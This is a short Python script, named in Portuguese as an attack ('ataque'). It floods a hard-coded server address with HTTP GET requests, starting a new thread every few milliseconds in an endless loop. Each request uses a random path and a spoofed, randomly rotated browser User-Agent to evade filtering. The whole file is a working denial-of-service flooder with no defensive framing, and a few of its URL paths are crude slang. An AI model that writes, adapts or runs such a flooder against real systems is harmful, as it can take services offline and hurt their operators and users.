import threading
import requests
import string
import time
import random

SERVIDOR = "http://10.3.1.49"

lista = ("Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0")

def ataque(SERVIDOR):
	listaURLS= ("/casa","/roupa","/agente","/global","/novinha","/queissonovinha","/eobruto","/noisefoda")

	url = SERVIDOR+random.choice(listaURLS)
	headers = {'User-agent':random.choice(lista)}
	res = requests.get(url,headers=headers)

while True:
	t1=threading.Thread(target=ataque,args=(SERVIDOR,))
	t1.start()
	tempo = "0.000"+random.choice(string.digits)
	time.sleep(float(tempo))